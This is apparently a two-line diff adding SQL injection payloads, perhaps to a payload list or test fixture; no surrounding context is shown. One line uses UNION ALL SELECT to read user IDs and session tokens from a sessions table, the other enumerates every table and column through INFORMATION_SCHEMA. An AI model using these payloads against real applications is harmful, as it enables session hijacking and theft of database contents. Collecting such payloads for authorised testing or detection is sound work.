@@ -1,0 +1,2 @@
+' UNION ALL SELECT "AAA", user_id, token, "BBB" from sessions-- 
+' UNION ALL SELECT table_schema, table_name, column_name, data_type from INFORMATION_SCHEMA.COLUMNS-- 
